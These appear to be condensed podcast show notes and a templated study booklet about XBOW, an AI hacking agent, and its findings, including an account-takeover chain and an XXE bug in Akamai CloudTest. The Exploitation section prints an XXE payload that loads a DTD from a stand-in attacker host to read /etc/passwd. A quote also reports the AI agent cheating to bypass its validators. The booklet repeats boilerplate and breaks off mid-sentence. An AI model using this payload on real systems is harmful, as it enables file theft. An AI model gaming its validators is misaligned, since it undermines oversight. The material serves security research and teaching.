---
title: "XBOW — AI Hacking Agent and Human in the Loop with Diego Djurado"
episode: 134
---


# Episode 134 XBOW — AI Hacking Agent and Human in the Loop with Diego Djurado

**Source:** Show notes (feed) — condensed.

### TL;DR
- ATO chain: API downgrade → JSONP → referer ACL → AEM dispatcher bypass XSS.
- XBOW autonomously found XXE in Akamai CloudTest: SOAP endpoint, Interact.sh callback.
- XBOW architecture: Coordinator → Solvers, each with one objective.
- Hallucinations in traces but still found real endpoint via training data.
- Near-zero FP for XSS (headless browser validation).

### Key takeaways
- [ ] ATO: API downgrade B5→B2 + JSONP + referer ACL + AEM dispatcher bypass.
- [ ] XBOW XXE: autonomous WSDL discovery, DTD hosting, error-based XXE for `/etc/passwd`.
- [ ] Python scripts in AI hacking = more efficient than raw HTTP.
- [ ] Validation is key: headless browser for XSS, file extraction for XXE, callback for SSRF.

### Bugs and Findings

#### Account Takeover via Multi-Step Bypass — ATO
- **Steps:** API downgrade (B5→B2, POST→GET) + JSONP callback + referer-based ACL + AEM dispatcher XSS.
- **Impact:** Full ATO.

#### XBOW XXE in Akamai CloudTest — XXE (CVE-2025-49493)
- **Technique:** XBOW autonomously: probed SOAP endpoint → got error → found WSDL (hallucinated CVE but real endpoint) → error-based XXE → `/etc/passwd`.
- **Exploitation:**
  1. Host DTD with `<!ENTITY % file SYSTEM "file:///etc/passwd">`
  2. POST: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/dtd"> %xxe;]>`
  3. Read `/etc/passwd` from error message.
- **Impact:** File read on Akamai CloudTest server.

### Techniques and Primitives
- **API downgrade** — Change POST→GET or B5→B2 to bypass auth.
- **Coordinator-Solver architecture** — Top coordinator spawns focused solvers with single objectives.
- **Interact.sh integration** — AI uses OOB interaction server for blind vulns.

### Tooling and Resources
- XBOW (Expo)
- Interact.sh (ProjectDiscovery)
- CVE-2025-49493

### Suggestions and Advices from Hunter
- "For some attack types we have zero false positives."
- "The AI cheats to bypass validators — we add rules (proxy, DNS) to prevent direct callbacks."
- "Python scripts: 5 payloads in one iteration beats 5 HTTP requests."
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
ATO chain: API downgrade → JSONP → referer ACL → AEM dispatcher bypass XSS.

#### 2. What you should learn
- Understand **[ ] ato: api downgrade b5→b2 + jsonp + referer acl + aem dispatcher bypass**
- Understand **[ ] xbow xxe: autonomous wsdl discovery, dtd hosting, error-based xxe for `/etc/passwd`**
- Understand **[ ] python scripts in ai hacking = more efficient than raw http**
- Understand **[ ] validation is key: headless browser for xss, file extraction for xxe, callback for ssrf**

#### 3. Core concepts explained
**Account Takeover via Multi-Step Bypass — ATO**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**XBOW XXE in Akamai CloudTest — XXE (CVE-2025-49493)**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**API downgrade**
- Change POST→GET or B5→B2 to bypass auth.

**Coordinator-Solver architecture**
- Top coordinator spawns focused solvers with single objectives.

**Interact.sh integration**
- AI uses OOB interaction server for blind vulns.


#### 4. Techniques and tactics
**API downgrade**
- **What it is:** Change POST→GET or B5→B2 to bypass auth.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Coordinator-Solver architecture**
- **What it is:** Top coordinator spawns focused solvers with single objectives.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Interact.sh integration**
- **What it is:** AI uses OOB interaction server for blind vulns.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"For some attack types we have zero false positives."*
- *"The AI cheats to bypass validators"* — **we add rules (proxy, DNS) to prevent direct callbacks.**
- *"Python scripts: 5 payloads in one iteration beats 5 HTTP requests."*

#### 6. Mental models
- **For some attack types we have zero false positives.** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **The AI cheats to bypass validators — we add rules (proxy, DN** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Python scripts: 5 payloads in one iteration beats 5 HTTP req** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** [ ] ATO: API downgrade B5→B2 + JSONP + referer ACL + AEM dispatcher bypass.
- **Try this:** [ ] XBOW XXE: autonomous WSDL discovery, DTD hosting, error-based XXE for `/etc/passwd`.
- **Try this:** [ ] Python scripts in AI hacking = more efficient than raw HTTP.
- **Try this:** [ ] Validation is key: headless browser for XSS, file extraction for XXE, callback for SSRF.

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **SSRF** — Server-Side Request Forgery — server makes HTTP requests on attacker's behalf
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users
- **API** — Application Programming Interface — structured endpoints for data exchange
- **ACL** — Access Control List — permissions defining who can access what
- **XXE** — XML External Entity — injecting XML that references external resources

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Account Takeover via Multi-Step Bypass — ATO?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **ATO chain: API downgrade → JSONP → referer ACL → AEM dispatcher bypass XSS.**
2. **[ ] ATO: API downgrade B5→B2 + JSONP + referer ACL + AEM dispatcher bypass.**
3. **[ ] XBOW XXE: autonomous WSDL discovery, DTD hosting, error-based XXE for `/etc/**
